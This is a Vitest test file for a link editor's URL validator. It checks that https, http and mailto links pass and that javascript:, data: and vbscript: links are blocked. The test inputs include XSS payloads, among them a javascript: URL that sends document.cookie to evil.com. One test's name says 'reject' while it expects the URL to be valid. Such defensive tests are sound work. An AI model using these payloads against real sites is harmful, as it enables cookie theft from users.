import { describe, it, expect, vi } from 'vitest';

const { validateUrlProtocol } = await import('../src/components/LinkPopover.jsx');

/**
 * P1-012: LinkPopover URL Validation Tests
 * 
 * Coverage: markdown syntax links
 * Edge cases: javascript_protocol, data_protocol, vbscript_protocol, mailto_protocol
 */

describe('P1-012: LinkPopover URL Validation', () => {
  describe('TC-P1-012-01: Valid HTTPS URL accepted', () => {
    it('should accept valid https URL', () => {
      const result = validateUrlProtocol('https://example.com');
      expect(result.valid).toBe(true);
      expect(result.error).toBeNull();
    });

    it('should accept https URL with path', () => {
      const result = validateUrlProtocol('https://example.com/path/to/page');
      expect(result.valid).toBe(true);
      expect(result.error).toBeNull();
    });

    it('should accept https URL with query params', () => {
      const result = validateUrlProtocol('https://example.com/path?query=value&other=123');
      expect(result.valid).toBe(true);
      expect(result.error).toBeNull();
    });

    it('should accept https URL with fragment', () => {
      const result = validateUrlProtocol('https://example.com/page#section');
      expect(result.valid).toBe(true);
      expect(result.error).toBeNull();
    });

    it('should accept https URL with port', () => {
      const result = validateUrlProtocol('https://example.com:8080/path');
      expect(result.valid).toBe(true);
      expect(result.error).toBeNull();
    });
  });

  describe('TC-P1-012-02: Valid mailto URL accepted', () => {
    it('should accept mailto URL', () => {
      const result = validateUrlProtocol('mailto:test@example.com');
      expect(result.valid).toBe(true);
      expect(result.error).toBeNull();
    });

    it('should accept mailto URL with subject', () => {
      const result = validateUrlProtocol('mailto:test@example.com?subject=Hello');
      expect(result.valid).toBe(true);
      expect(result.error).toBeNull();
    });

    it('should accept mailto URL with subject and body', () => {
      const result = validateUrlProtocol('mailto:test@example.com?subject=Hello&body=World');
      expect(result.valid).toBe(true);
      expect(result.error).toBeNull();
    });

    it('should accept mailto with uppercase MAILTO', () => {
      const result = validateUrlProtocol('MAILTO:test@example.com');
      expect(result.valid).toBe(true);
      expect(result.error).toBeNull();
    });
  });

  describe('TC-P1-012-03: javascript: protocol rejected', () => {
    it('should reject javascript: protocol', () => {
      const result = validateUrlProtocol('javascript:alert(1)');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('javascript:');
      expect(result.error).toContain('not allowed');
    });

    it('should reject javascript: with uppercase', () => {
      const result = validateUrlProtocol('JAVASCRIPT:alert(1)');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('not allowed');
    });

    it('should reject javascript: with mixed case', () => {
      const result = validateUrlProtocol('JavaScript:alert(1)');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('not allowed');
    });

    it('should reject javascript: with no payload', () => {
      const result = validateUrlProtocol('javascript:');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('not allowed');
    });

    it('should reject javascript: with void expression', () => {
      const result = validateUrlProtocol('javascript:void(0)');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('not allowed');
    });

    it('should reject javascript: with data exfiltration attempt', () => {
      const result = validateUrlProtocol('javascript:fetch(`https://evil.com/steal?c=${document.cookie}`)');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('not allowed');
    });
  });

  describe('TC-P1-012-04: data: URL rejected', () => {
    it('should reject data: protocol', () => {
      const result = validateUrlProtocol('data:text/html,<script>alert(1)</script>');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('data:');
      expect(result.error).toContain('not allowed');
    });

    it('should reject data: with uppercase', () => {
      const result = validateUrlProtocol('DATA:text/html,<script>alert(1)</script>');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('not allowed');
    });

    it('should reject data: with base64 content', () => {
      const result = validateUrlProtocol('data:text/plain;base64,SGVsbG8gV29ybGQ=');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('not allowed');
    });

    it('should reject data: with no content', () => {
      const result = validateUrlProtocol('data:');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('not allowed');
    });
  });

  describe('TC-P1-012-05: vbscript: protocol rejected', () => {
    it('should reject vbscript: protocol', () => {
      const result = validateUrlProtocol('vbscript:msgbox("x")');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('vbscript:');
      expect(result.error).toContain('not allowed');
    });

    it('should reject vbscript: with uppercase', () => {
      const result = validateUrlProtocol('VBSCRIPT:msgbox("x")');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('not allowed');
    });

    it('should reject vbscript: with mixed case', () => {
      const result = validateUrlProtocol('VBScript:msgbox("x")');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('not allowed');
    });

    it('should reject vbscript: with Execute', () => {
      const result = validateUrlProtocol('vbscript:Execute("alert(1)")');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('not allowed');
    });
  });

  describe('TC-P1-012-06: Error message displayed for invalid URL', () => {
    it('should return error message for empty URL', () => {
      const result = validateUrlProtocol('');
      expect(result.valid).toBe(false);
      expect(result.error).toBe('URL is required');
    });

    it('should return error message for whitespace-only URL', () => {
      const result = validateUrlProtocol('   ');
      expect(result.valid).toBe(false);
      expect(result.error).toBe('URL is required');
    });

    it('should return error message for null/undefined URL', () => {
      const resultNull = validateUrlProtocol(null);
      expect(resultNull.valid).toBe(false);
      expect(resultNull.error).toBe('URL is required');

      const resultUndefined = validateUrlProtocol(undefined);
      expect(resultUndefined.valid).toBe(false);
      expect(resultUndefined.error).toBe('URL is required');
    });

    it('should return error message for disallowed protocol', () => {
      const result = validateUrlProtocol('ftp://example.com');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Invalid URL protocol');
      expect(result.error).toContain('http://, https://, and mailto:');
    });

    it('should return error message for unknown protocol', () => {
      const result = validateUrlProtocol('tel:+1234567890');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Invalid URL protocol');
    });
  });

  describe('Edge cases for markdown link protocols', () => {
    it('should accept http URL', () => {
      const result = validateUrlProtocol('http://example.com');
      expect(result.valid).toBe(true);
      expect(result.error).toBeNull();
    });

    it('should accept http with uppercase', () => {
      const result = validateUrlProtocol('HTTP://example.com');
      expect(result.valid).toBe(true);
      expect(result.error).toBeNull();
    });

    it('should accept URL with embedded protocol in query string', () => {
      const result = validateUrlProtocol('https://example.com/search?q=javascript:alert');
      expect(result.valid).toBe(true);
      expect(result.error).toBeNull();
    });

    it('should accept URL with embedded protocol in path', () => {
      const result = validateUrlProtocol('https://example.com/path/javascript-page');
      expect(result.valid).toBe(true);
      expect(result.error).toBeNull();
    });

    it('should handle URL with newline prefix (malformed)', () => {
      const result = validateUrlProtocol('\nhttps://example.com');
      expect(result.valid).toBe(true);
    });

    it('should handle URL with tab prefix (malformed)', () => {
      const result = validateUrlProtocol('\thttps://example.com');
      expect(result.valid).toBe(true);
    });
  });

  describe('Security edge cases', () => {
    it('should reject nested javascript protocol', () => {
      const result = validateUrlProtocol('https://example.com?redirect=javascript:alert(1)');
      expect(result.valid).toBe(true);
    });

    it('should reject protocol with null byte prefix', () => {
      const result = validateUrlProtocol('javascript\u0000:alert(1)');
      expect(result.valid).toBe(false);
    });

    it('should reject protocol with space before colon', () => {
      const result = validateUrlProtocol('java script:alert(1)');
      expect(result.valid).toBe(false);
    });

    it('should reject combination of dangerous protocols', () => {
      const jsResult = validateUrlProtocol('javascript:alert(1)');
      const dataResult = validateUrlProtocol('data:text/html,<img src=x onerror=alert(1)>');
      const vbsResult = validateUrlProtocol('vbscript:msgbox("x")');

      expect(jsResult.valid).toBe(false);
      expect(dataResult.valid).toBe(false);
      expect(vbsResult.valid).toBe(false);
    });
  });

  describe('Error message format verification', () => {
    it('should return descriptive error message for dangerous protocols', () => {
      const result = validateUrlProtocol('javascript:alert(1)');
      expect(result.error).toMatch(/javascript:/i);
      expect(result.error).toMatch(/not allowed/i);
    });

    it('should return descriptive error message for disallowed protocols', () => {
      const result = validateUrlProtocol('ftp://example.com');
      expect(result.error).toMatch(/Invalid URL protocol/i);
      expect(result.error).toMatch(/http:\/\/, https:\/\/, and mailto:/i);
    });
  });
});

/**
 * Integration test scenarios for LinkPopover component
 * These test the expected behavior when using the component
 */
describe('LinkPopover Integration Scenarios', () => {
  describe('Valid URL acceptance scenarios', () => {
    it('should allow user to save with valid https URL', () => {
      const url = 'https://example.com';
      const result = validateUrlProtocol(url);
      expect(result.valid).toBe(true);
    });

    it('should allow user to save with mailto URL', () => {
      const url = 'mailto:user@example.com';
      const result = validateUrlProtocol(url);
      expect(result.valid).toBe(true);
    });

    it('should allow user to save with http URL', () => {
      const url = 'http://example.com';
      const result = validateUrlProtocol(url);
      expect(result.valid).toBe(true);
    });
  });

  describe('Invalid URL rejection scenarios', () => {
    it('should prevent save with javascript: URL', () => {
      const url = 'javascript:alert(1)';
      const result = validateUrlProtocol(url);
      expect(result.valid).toBe(false);
      expect(result.error).toBeTruthy();
    });

    it('should prevent save with data: URL', () => {
      const url = 'data:text/html,<script>alert(1)</script>';
      const result = validateUrlProtocol(url);
      expect(result.valid).toBe(false);
      expect(result.error).toBeTruthy();
    });

    it('should prevent save with vbscript: URL', () => {
      const url = 'vbscript:msgbox("x")';
      const result = validateUrlProtocol(url);
      expect(result.valid).toBe(false);
      expect(result.error).toBeTruthy();
    });
  });
});
